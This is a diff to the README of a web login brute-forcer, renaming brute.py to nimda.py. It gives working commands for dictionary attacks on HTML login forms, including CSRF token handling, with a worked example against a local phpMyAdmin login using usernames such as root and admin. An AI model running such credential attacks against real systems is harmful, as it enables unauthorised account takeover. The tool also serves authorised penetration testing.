@@ -26,19 +26,19 @@ you need to provide necessary details and then ready to go.**
 **help** -> Display help
 
 **url** -> Set target url for submission post request
-example: `python brute.py url='http://exmpl.cm/lg.php'` 
+example: `python nimda.py url='http://exmpl.cm/lg.php'` 
 
 **username** -> Set username details with HTML form name and its value
 example: `<input type="text" value="site_admin" name="pg_user">`
 
-then: `python brute.py username='pg_user=site_admin'`
+then: `python nimda.py username='pg_user=site_admin'`
 
 **password** -> Set dictionary file
 example: `<input type="password" value="" name="pg_passwd">`
 
 Dict file: `./lsts/passwords.lst`
 
-then: `python brute.py password='pg_passwd=./lsts/passwords.lst'`
+then: `python nimda.py password='pg_passwd=./lsts/passwords.lst'`
 
 
 Some login forms are protected with some CSRF TOKENS.
@@ -52,7 +52,7 @@ And `csrf-selector` is `document.querySelector` syntax in order to find this val
 then: `csrf-selector='input[name="cstf_hid_token"]'
 so result looks like:
 ```
-python brute.py url='http://exmpl.cm/lg.php' username='pg_user=site_admin' password='pg_passwd=./lsts/passwords.lst' csrf-token-name='cstf_hid_token' csrf-selector='input[name="cstf_hid_token"]'
+python nimda.py url='http://exmpl.cm/lg.php' username='pg_user=site_admin' password='pg_passwd=./lsts/passwords.lst' csrf-token-name='cstf_hid_token' csrf-selector='input[name="cstf_hid_token"]'
 ```
 
 
@@ -118,12 +118,12 @@ Displays Error : `Access denied for user` which is only if authentication fails
 Our Code for Brute-forcing is:
 
 ```
-python brute.py url='http://localhost/phpmyadmin/index.php' username='pma_username=root,admin,nimda,ttu' password='pma_password=./small.txt' csrf-token-name='token' csrf-selector='input[name="token"]' post-data='server=1&target=index.php' not-content-text='Access denied for user'
+python nimda.py url='http://localhost/phpmyadmin/index.php' username='pma_username=root,admin,nimda,ttu' password='pma_password=./small.txt' csrf-token-name='token' csrf-selector='input[name="token"]' post-data='server=1&target=index.php' not-content-text='Access denied for user'
 ```
 <img src="./img/1.png">
 
 
 ```
-python brute.py url='http://localhost/phpmyadmin/index.php' username='pma_username=root,admin,ttu,nimda' password='pma_password=./small.txt' csrf-token-name='token' csrf-selector='input[name="token"]' post-data='server=1&target=index.php' content-text='information_schema' progress-bar
+python nimda.py url='http://localhost/phpmyadmin/index.php' username='pma_username=root,admin,ttu,nimda' password='pma_password=./small.txt' csrf-token-name='token' csrf-selector='input[name="token"]' post-data='server=1&target=index.php' content-text='information_schema' progress-bar
 ```
 <img src="./img/2.png">
